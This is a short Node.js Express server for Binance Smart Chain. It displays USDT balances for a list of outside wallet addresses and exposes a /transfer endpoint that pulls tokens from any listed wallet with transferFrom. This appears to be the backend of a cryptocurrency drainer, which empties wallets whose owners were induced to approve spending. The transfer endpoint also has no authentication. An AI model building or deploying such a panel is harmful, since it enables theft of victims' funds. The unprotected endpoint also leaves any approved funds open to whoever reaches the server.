const express = require("express");
const path = require("path");
const dotenv = require("dotenv");
const { ethers } = require("ethers");
const fs = require("fs");

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const PRIVATE_KEY = process.env.PRIVATE_KEY;

// ✅ BSC RPC provider with chain info to avoid ENS errors
const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/", {
  name: "binance",
  chainId: 56,
});

const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const USDT_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transferFrom(address from, address to, uint amount) returns (bool)"
];

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);

// ✅ Route: Admin Panel on root "/"
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// ✅ API: Load dynamic wallet list from wallets.json
app.get("/wallets", async (req, res) => {
  try {
    const walletList = JSON.parse(fs.readFileSync("wallets.json"));
    const result = await Promise.all(walletList.map(async (addr) => {
      const balance = await contract.balanceOf(addr);
      return {
        wallet: addr,
        balance: ethers.utils.formatUnits(balance, 18)
      };
    }));

    res.json(result);
  } catch (err) {
    console.error("❌ Error loading wallets:", err);
    res.status(500).json({ error: "Failed to fetch wallets or balances" });
  }
});

// ✅ API: Transfer funds using transferFrom
app.post("/transfer", async (req, res) => {
  try {
    const { fromWallet, toWallet, amount } = req.body;
    const tx = await contract.transferFrom(fromWallet, toWallet, ethers.utils.parseUnits(amount, 18));
    await tx.wait();
    res.json({ success: true, hash: tx.hash });
  } catch (err) {
    console.error("❌ Transfer Error:", err);
    res.status(500).json({ success: false, error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Backend admin panel running at http://localhost:${PORT}`);
});
